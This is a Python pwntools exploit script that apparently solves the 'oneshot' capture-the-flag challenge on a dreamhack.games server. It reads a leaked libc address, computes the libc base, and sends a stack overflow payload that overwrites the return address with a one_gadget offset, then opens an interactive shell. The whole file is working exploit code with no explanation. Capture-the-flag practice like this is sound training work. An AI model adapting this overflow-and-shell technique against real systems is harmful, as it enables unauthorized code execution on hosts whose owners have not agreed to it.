#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+138
                   b*main+102
                   c
                   ''')
    else:
        r = remote("host3.dreamhack.games", 17120)

    return r


def main():
    r = conn()
    input()
    r.recvuntil(b"stdout: ")
    leak = int(r.recvline(keepends=False).decode(), 16)
    libc.address = leak - 3954208
    log.info("libc: " + hex(libc.address))

    one_gadget = 0x45216
    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
    r.sendafter(b"MSG: ", payload)
    r.interactive()


if __name__ == "__main__":
    main()
